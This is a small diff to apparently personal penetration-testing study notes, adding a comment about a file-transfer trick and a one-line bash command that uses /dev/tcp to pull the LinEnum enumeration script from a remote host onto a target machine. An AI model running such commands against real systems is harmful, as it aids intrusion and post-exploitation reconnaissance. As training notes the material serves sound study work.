@@ -85,3 +85,9 @@ Procmon something and follow along
 
 Atomic wannabe APT 
 https://github.com/redcanaryco/invoke-atomicredteam
+
+
+Powershell or `echo` version of Ippsec's `cat` file tranfer for windows!. WOW on the cat file transfer, I have not seen this on any OSCP cheatsheets! - findstr would be obvious choice but I really want and echo version.
+```bash
+bash -c "cat < /dev/tcp/$IP/$PORT > /tmp/LinEnum.sh"
+```
